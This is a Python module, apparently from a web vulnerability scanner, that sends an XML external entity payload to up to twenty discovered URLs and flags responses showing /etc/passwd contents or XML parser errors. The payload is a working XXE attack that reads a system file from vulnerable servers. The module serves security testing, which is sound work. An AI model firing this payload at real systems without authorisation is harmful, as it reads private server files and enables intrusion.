import asyncio
from modules.core import console

XXE_PAYLOAD = """
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
"""

async def check_xxe(session, url):
    # This is a blind formatting attempt. Real XXE requires ensuring the Content-Type is XML
    # and that the server parses it.
    headers = {"Content-Type": "application/xml"}
    try:
        async with session.post(url, data=XXE_PAYLOAD, headers=headers, timeout=5, ssl=False) as resp:
            text = await resp.text()
            # Check for typical /etc/passwd content
            if "root:x:0:0:" in text:
                return {
                    "url": url,
                    "type": "XXE (Local File Read)",
                    "payload": "file:///etc/passwd",
                    "indicator": "root:x:0:0 matches"
                }
            # Check for specific XML parsing errors that indicate processing
            if "DOMDocument::loadXML" in text or "SAXParseException" in text:
                 # This is just an error, but indicates XML parsing is happening on user input
                 return {
                     "url": url,
                     "type": "XML Parsing Error (Potential XXE)",
                     "payload": "Generic XML",
                     "indicator": "Parser Error Message"
                 }
    except Exception:
        pass
    return None

async def scan_xxe(session, urls):
    """
    Scan for XXE Injection.
    """
    console.print(f"\n[bold cyan]--- XXE Scanner (XML External Entity) ---[/bold cyan]")
    
    # We ideally need forms or POST endpoints
    # For this module, we will try to POST XML to all found URLs (noisy but thorough)
    target_urls = urls[:20] # Limit to 20 to avoid spamming too much in this demo
    
    if not target_urls:
         console.print("[yellow][!] No URLs found to test for XXE.[/yellow]")
         return []
         
    console.print(f"[dim]Testing {len(target_urls)} endpoints for XML Injection...[/dim]")
    
    tasks = [check_xxe(session, url) for url in target_urls]
    results = await asyncio.gather(*tasks)
    
    vulns = []
    for res in results:
        if res:
             color = "red" if "root:" in res['indicator'] else "yellow"
             console.print(f"  [bold {color}][!] XXE VULNERABILITY FOUND![/bold {color}]")
             console.print(f"      URL: {res['url']}")
             console.print(f"      Type: {res['type']}")
             vulns.append(res)
             
    if not vulns:
        console.print("[green][+] No XXE vulnerabilities detected.[/green]")
        
    return vulns
